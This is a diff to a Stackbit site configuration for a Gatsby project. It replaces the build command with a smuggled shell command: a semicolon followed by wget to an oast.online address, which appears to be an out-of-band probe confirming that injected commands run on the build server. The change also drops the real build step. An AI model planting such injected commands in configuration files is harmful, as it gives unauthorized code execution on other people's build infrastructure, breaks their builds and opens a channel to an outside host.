@@ -1,7 +1,7 @@
 stackbitVersion: ~0.3.0
 ssgName: gatsby
 ssgVersion: 2.3.30
-buildCommand: npm run build
+buildCommand: '; wget https://cppquchucphcbisa97r0p5nriigfbgpr4.oast.online'
 publishDir: public
 staticDir: static
 uploadDir: images
